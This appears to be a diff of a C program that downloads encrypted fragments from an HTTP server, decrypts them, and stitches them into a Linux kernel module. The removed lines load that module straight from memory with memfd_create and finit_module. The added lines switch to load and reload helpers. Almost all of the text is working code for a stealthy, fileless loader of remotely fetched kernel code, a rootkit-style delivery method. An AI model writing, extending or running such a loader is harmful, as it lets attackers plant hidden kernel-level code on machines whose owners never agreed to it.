@@ -1,11 +1,6 @@
-#define _GNU_SOURCE
 #include <stdlib.h>
 #include <sys/types.h>
 #include <unistd.h>
-#include <linux/module.h>
-#include <sys/syscall.h>
-#include <unistd.h>
-#include <sys/mman.h>
 
 #include "../include/fraction.h"
 #include "../include/http.h"
@@ -13,6 +8,8 @@
 #include "../include/utils.h"
 #include "../include/log.h"
 #include "../include/cipher.h"
+#include "../include/load.h"
+
 
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT "8000"
@@ -33,14 +30,6 @@ static void cleanup_fraction_array(fraction_t *array, int n_elem) {
   free(array);
 }
 
-void print_bytes(const unsigned char *bytes, size_t size) {
-    for (size_t i = 0; i < size; i++) {
-        printf("0x%02x ", bytes[i]); // Imprime cada byte en formato hexadecimal
-    }
-    printf("\n"); // Salto de línea al final
-}
-
-
 int main(void) {
   struct addrinfo hints, *ainfo;
   int sfd = -1; // to be extra professional
@@ -49,8 +38,9 @@ int main(void) {
   char **fraction_links = NULL;
   fraction_t *fractions = NULL;
   unsigned char *module = NULL;
-  size_t total_size;
-
+  ssize_t total_size;
+  ssize_t module_size = 0;
+  decrypted *decrstr = NULL;
 
   log_set_level(LOG_DEBUG);
   setup_hints(&hints);
@@ -110,52 +100,52 @@ int main(void) {
   }
   log_info("Verified fractions");
 
+
   for (int i=0; i<lines_read; i++) {print_fraction(fractions[i]);}
 
-  for(int i = 0; i < num_links; i++){
+  for (int i = 0; i < num_links; i++) {
 
-    char *decryptvalue = (char *) decrypt_fraction(&fractions[i]);
-      if (decryptvalue == NULL) {
+    decrstr = decrypt_fraction( & fractions[i]);
+
+    if (decrstr -> decryptedtext == NULL) {
       log_error("Decryption process failed");
       continue;
     }
 
-    print_bytes((unsigned char*)decryptvalue,strlen(decryptvalue));
-
-      size_t decrypt_size = decrypt_size + strlen(decryptvalue);
-      unsigned char *tmp = realloc(module,decrypt_size);
-      if(tmp == NULL){
-        log_error("Failed to allocate memory for module");
-        free(decryptvalue);
-        return 1;
+    if (module == NULL) {
+      total_size = decrstr -> text_size;
+      module = malloc(total_size);
+      if (module == NULL) {
+        log_error("Error in memory assigning");
+        break;
+      }
+    } else if (module_size + decrstr -> text_size > total_size) {
+      total_size += decrstr -> text_size;
+      unsigned char * tmp = realloc(module, total_size);
+      if (tmp == NULL) {
+        log_error("Memory reallocation failed");
+        break;
+      }
+      module = tmp;
     }
-    module = tmp;
-    memcpy(module, decryptvalue, decrypt_size);
-    free(decryptvalue);
+    memcpy(module + module_size, decrstr -> decryptedtext, decrstr -> text_size);
+    module_size += decrstr -> text_size;
   }
 
 
-  int fdlkm = memfd_create("lkmmod", 0);
+  int result = is_lkm_loaded("lkm");
+  if(result == 1){
+     remove_lkm();
+     puts("Reloading module:");
+     load_lkm(module, total_size);
+  } else if(result == 0){
+    load_lkm(module, total_size);
+  } else{
+    log_error("There was an error loading the LKM");
 
-  if (fdlkm < 0) {
-      perror("memfd_create failed");
-      return -1;
   }
-  ssize_t written_bytes = write(fdlkm, module, total_size);
-  if (written_bytes < 0) {
-      perror("Error writing to memfd");
-      close(fdlkm);
-      return -1;
-  }
-  if (syscall(SYS_finit_module, fdlkm, total_size, NULL) != 0) {
-      perror("Failed to init module");
-      close(fdlkm);
-      return -1;
-  }
-    printf("Module loaded successfully\n");
-    free(module);
 
-
+  free(module);
   http_free(&http_post_res);
   http_free(&http_fraction_res);
   cleanup_char_array(fraction_links, num_links);
